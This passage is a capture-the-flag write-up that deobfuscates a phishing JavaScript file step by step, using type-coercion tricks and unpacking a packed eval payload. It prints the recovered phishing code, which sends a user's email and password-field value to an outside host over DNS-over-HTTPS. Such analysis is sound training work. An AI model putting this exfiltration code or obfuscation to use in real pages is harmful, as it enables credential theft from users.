# Query

> **While investigating a phishing attempt, you came across a suspicious**
> **JavaScript file. Can you find out more about it?**

## Type casting & tricks

This script plays with type conversions; for example in:

```javascript
(![] + "")[HTB]
```

`![]` is the logical negation of the empty array `[]`.

> Surprisingly, the empty array evaluates to `true`!

```javascript
Boolean([]);
true
Boolean({});
true
Boolean("");
false
```

So then `![]` is `false` and casting it to a string gives `"false"`.

Finally, the letter at index `HTB` / 0 is "f".

The weird expressions actually resolve to strings and numbers: we can just
replace them with their result.

```javascript
HTB = -1; // bitwise not on empty string

HTB = {
    ___: 0, // increment from -1 to 0
    $$$$: "f", // index 0 of "false"
    __$: 1,
    $_$_: "a", // index 1 of "false"
    _$_: 2,
    $_$$: "b", // index 2 of "[object Object]"
    $$_$: "d", // index 2 of "undefined"
    _$$: 3,
    $$$_: "e", // index 3 of "true"
    $__: 4,
    $_$: 5,
    $$__: "c", // index 5 of "[object Object]"
    $$_: 6,
    $$$: 7,
    $___: 8,
    $__$: 9,
    $_: "constructor",
    $$: "return"
};
```

## Rewriting the whole script?

Next let's substitute each HTB `HTB.___` with its actual content.

> be wary of ambiguities: `HTB.$$_` is part of `HTB.$$_$` too!

To avoid replacing part of a key, we start with the longest keys and proceed
in descending order.

```bash
perl -pe 's#HTB\.\$\$\$\$#"f"#g' htb.js > htb.sub.js
```

Or not! It's way too tedious...

## Anonymous

Actually, the huge expression ends with `()`: it is most likely a definition
that is being evaluated.

So removing the parentheses should define a new function.

```javascript
(function anonymous() {
    eval(function(p, a, c, k, e, d) {
        e = function(c) {
            return c
        }
        ;
        if (!''.replace(/^/, String)) {
            while (c--) {
                d[c] = k[c] || c
            }
            k = [function(e) {
                return d[e]
            }
            ];
            e = function() {
                return '\\w+'
            }
            ;
            c = 1
        }
        ;while (c--) {
            if (k[c]) {
                p = p.replace(new RegExp('\\b' + e(c) + '\\b','g'), k[c])
            }
        }
        return p
    }('7 304(){46.49(\'209\').305(\'306\',197)}7 197(){307 205="303://302.193/";19(46.49(\'101\')...', 10, 554, '||||||var|function|return|_0x5321c8|_0x50f60b|0x1|...|'.split('|'), 0, {}))

}
)
```

More obfuscated code!

Crazy to see how a clunky heap of special characters merged to form meaningful
code! From nails to a nasty damascus blade to a steel block.

- `p` looks like javascript code where the variable and function names have been
  replaced with numbers
- `a` is 10
- `c` is 554, the length of the array supplied in k
- `k` is an array of commands and variable names
- `e` is 0
- `d` is an empty dictionary

Some of these arguments are modified inside the anonymous function.
The specifics are fun, but don't matter in the end.

Replacing the `eval` with `console.log` will directly show the arguments after
unpacking:

```javascript
function de1fb561338fe0fa7d1b7e13ff4219f6() {
    document.getElementById("d1e0cb08a90965a7489aabc5f6d423ea").addEventListener("change", d57ad09bd0208501e2808afa64e55af1);
}

function d57ad09bd0208501e2808afa64e55af1() {
    const f4df21ccca072ba5e003e265e4314aa4 = "https://SFRCe3NvcnJ5X2J1dF90aGlzX2lzX25vdF95b3VyX2ZsYWd9.htb/";
    if (document.getElementById("7747eeee2f2dc162cc853a8371395dd5").value && document.getElementById("7747eeee2f2dc162cc853a8371395dd5").value.endsWith("@mail.htb")) {
        doh.sendDohMsg(doh.makeQuery(f9061f7c0fe73c0f0a9d310251a0f3b2(document.getElementById("7747eeee2f2dc162cc853a8371395dd5").value, document.getElementById("d1e0cb08a90965a7489aabc5f6d423ea").value), "A"), f4df21ccca072ba5e003e265e4314aa4, "GET");
    }
}
...
```

## Defeating the final boss

The payload keeps leveling up! We're now facing a troll:

```bash
echo SFRCe3NvcnJ5X2J1dF90aGlzX2lzX25vdF95b3VyX2ZsYWd9 | base64 -d
HTB{sorry_but_this_is_not_your_flag}
```

Still, let's scan all the lines